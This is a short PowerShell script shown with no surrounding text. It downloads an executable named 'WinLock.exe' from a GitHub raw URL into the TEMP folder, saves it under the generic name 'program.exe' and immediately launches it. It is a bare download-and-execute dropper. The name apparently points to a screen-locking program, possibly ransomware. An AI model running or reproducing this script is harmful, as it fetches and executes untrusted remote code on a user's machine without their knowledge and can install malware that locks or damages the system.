$url = "https://raw.githubusercontent.com/fasa3e/idkidkvanishlock/refs/heads/main/WinLock.exe"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
